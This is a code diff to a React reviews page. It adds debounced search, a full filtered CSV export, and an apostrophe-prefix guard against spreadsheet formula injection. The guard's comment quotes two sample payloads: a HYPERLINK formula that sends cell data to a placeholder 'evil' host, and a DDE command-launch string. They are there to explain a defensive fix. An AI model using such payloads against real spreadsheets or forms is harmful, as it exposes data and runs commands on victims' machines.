@@ -63,6 +63,15 @@ const SOURCE_LABELS: Record<string, string> = {
 
 const PAGE_SIZE = 20;
 
+/**
+ * Ceiling on a single CSV export.
+ *
+ * The list API caps `limit` server-side, so this is a request rather than a promise — the
+ * toast reports what actually came back when the two differ. High enough that no realistic
+ * merchant notices, low enough that one click cannot ask the database for a million rows.
+ */
+const EXPORT_LIMIT = 5000;
+
 export default function ReviewsPage() {
   const confirm = useConfirm();
   const [reviews, setReviews] = useState<Review[]>([]);
@@ -73,9 +82,19 @@ export default function ReviewsPage() {
   const [replyDialog, setReplyDialog] = useState<string | null>(null);
   const [replyText, setReplyText] = useState('');
   const [busyId, setBusyId] = useState<string | null>(null);
+  const [exporting, setExporting] = useState(false);
 
   // Filters
   const [search, setSearch] = useState('');
+  /**
+   * The search term the server actually sees.
+   *
+   * The input fed `fetchReviews` directly, so every keystroke fired a request: typing
+   * "necklace" issued eight, each returning out of order, and the list flickered through
+   * results for "n", "ne", "nec"... 250ms is below the threshold where the delay reads as
+   * lag and above a comfortable typing cadence.
+   */
+  const [debouncedSearch, setDebouncedSearch] = useState('');
   const [ratingFilter, setRatingFilter] = useState<string>('all');
   const [sourceFilter, setSourceFilter] = useState<string>('all');
   const [sentimentFilter, setSentimentFilter] = useState<string>('all');
@@ -85,6 +104,27 @@ export default function ReviewsPage() {
   const [sortBy, setSortBy] = useState('reviewDate');
   const [sortOrder, setSortOrder] = useState('desc');
   const [showFilters, setShowFilters] = useState(false);
+
+  /**
+   * The active filter set, without pagination.
+   *
+   * Shared by the list fetch and the CSV export so the two can never disagree about what
+   * the merchant is looking at — the export used to write whatever happened to be in
+   * `reviews` state, which is one page.
+   */
+  const filterParams = useCallback(() => {
+    const params = new URLSearchParams();
+    if (debouncedSearch) params.set('search', debouncedSearch);
+    if (ratingFilter !== 'all') params.set('rating', ratingFilter);
+    if (sourceFilter !== 'all') params.set('source', sourceFilter);
+    if (sentimentFilter !== 'all') params.set('sentiment', sentimentFilter);
+    if (publishedFilter !== 'all') params.set('isPublished', publishedFilter);
+    if (verifiedFilter !== 'all') params.set('verifiedPurchase', verifiedFilter);
+    if (imagesFilter !== 'all') params.set('hasImages', imagesFilter);
+    params.set('sortBy', sortBy);
+    params.set('sortOrder', sortOrder);
+    return params;
+  }, [debouncedSearch, ratingFilter, sourceFilter, sentimentFilter, publishedFilter, verifiedFilter, imagesFilter, sortBy, sortOrder]);
 
   /**
    * Load the review list for the current filters.
@@ -101,16 +141,7 @@ export default function ReviewsPage() {
   const fetchReviews = useCallback(async () => {
     setLoading(true);
     try {
-      const params = new URLSearchParams();
-      if (search) params.set('search', search);
-      if (ratingFilter !== 'all') params.set('rating', ratingFilter);
-      if (sourceFilter !== 'all') params.set('source', sourceFilter);
-      if (sentimentFilter !== 'all') params.set('sentiment', sentimentFilter);
-      if (publishedFilter !== 'all') params.set('isPublished', publishedFilter);
-      if (verifiedFilter !== 'all') params.set('verifiedPurchase', verifiedFilter);
-      if (imagesFilter !== 'all') params.set('hasImages', imagesFilter);
-      params.set('sortBy', sortBy);
-      params.set('sortOrder', sortOrder);
+      const params = filterParams();
       params.set('page', String(page));
       params.set('limit', String(PAGE_SIZE));
 
@@ -129,7 +160,12 @@ export default function ReviewsPage() {
     } finally {
       setLoading(false);
     }
-  }, [search, ratingFilter, sourceFilter, sentimentFilter, publishedFilter, verifiedFilter, imagesFilter, sortBy, sortOrder, page]);
+  }, [filterParams, page]);
+
+  useEffect(() => {
+    const t = setTimeout(() => setDebouncedSearch(search), 250);
+    return () => clearTimeout(t);
+  }, [search]);
 
   /* eslint-disable react-hooks/set-state-in-effect */
   useEffect(() => {
@@ -151,8 +187,35 @@ export default function ReviewsPage() {
    * The BOM is there so Excel opens UTF-8 correctly; without it, accented names and any
    * non-Latin script arrive as mojibake, which is most of the value of an export gone.
    */
-  const exportCsv = () => {
-    if (!reviews.length) {
+  const exportCsv = async () => {
+    if (!total) {
+      toast.error('There are no reviews to export');
+      return;
+    }
+
+    // Fetch the whole filtered set, not the page on screen.
+    //
+    // This used to serialise `reviews` state — one page, at most 20 rows — while the button
+    // sat next to a count reading "1,284 reviews". A merchant exporting their catalogue for
+    // a migration or a backup got twenty rows and no indication anything was missing, which
+    // is the worst shape a data-export bug can take.
+    setExporting(true);
+    let rows: Review[] = [];
+    try {
+      const params = filterParams();
+      params.set('page', '1');
+      params.set('limit', String(EXPORT_LIMIT));
+      const data = await apiFetch<{ reviews?: Review[]; total?: number }>(`/api/reviews?${params}`);
+      rows = data.reviews || [];
+    } catch (err) {
+      toast.error(errorMessage(err, 'Could not export your reviews'));
+      setExporting(false);
+      return;
+    } finally {
+      setExporting(false);
+    }
+
+    if (!rows.length) {
       toast.error('There are no reviews to export');
       return;
     }
@@ -171,10 +234,28 @@ export default function ReviewsPage() {
       ['Reply', r => r.reply ?? ''],
     ];
 
-    const cell = (value: unknown) => `"${String(value ?? '').replace(/"/g, '""')}"`;
+    /**
+     * RFC 4180 quoting, plus a guard against spreadsheet formula injection.
+     *
+     * Review bodies are attacker-supplied: anyone can type `=HYPERLINK("http://evil/"&A1)`
+     * or `@SUM(1+1)*cmd|'/c calc'!A0` into a public review form. Quoting alone does not stop
+     * that — Excel, LibreOffice and Sheets all strip the quotes and then evaluate any cell
+     * whose first character is `=`, `+`, `-`, `@`, or a tab/CR, so the merchant opening their
+     * own export is the one who runs it. This is the standard CSV-injection path, and it is
+     * a real one here because the merchant is exactly who downloads this file.
+     *
+     * A leading apostrophe forces the cell to text in every one of those programs. It is
+     * visible in the cell, which is the accepted trade: a slightly odd-looking cell beats a
+     * formula executing on the merchant's machine.
+     */
+    const cell = (value: unknown) => {
+      const raw = String(value ?? '');
+      const dangerous = /^[=+\-@\t\r]/.test(raw);
+      return `"${(dangerous ? `'${raw}` : raw).replace(/"/g, '""')}"`;
+    };
     const csv = [
       columns.map(([header]) => cell(header)).join(','),
-      ...reviews.map(r => columns.map(([, get]) => cell(get(r))).join(',')),
+      ...rows.map(r => columns.map(([, get]) => cell(get(r))).join(',')),
     ].join('\r\n');
 
     const blob = new Blob(['﻿' + csv], { type: 'text/csv;charset=utf-8;' });
@@ -185,7 +266,11 @@ export default function ReviewsPage() {
     a.click();
     URL.revokeObjectURL(url);
 
-    toast.success(`Exported ${reviews.length} review${reviews.length === 1 ? '' : 's'}`);
+    toast.success(
+      rows.length < total
+        ? `Exported the first ${rows.length.toLocaleString()} of ${total.toLocaleString()} reviews`
+        : `Exported ${rows.length.toLocaleString()} review${rows.length === 1 ? '' : 's'}`
+    );
   };
 
   const toggleSelect = (id: string) => {
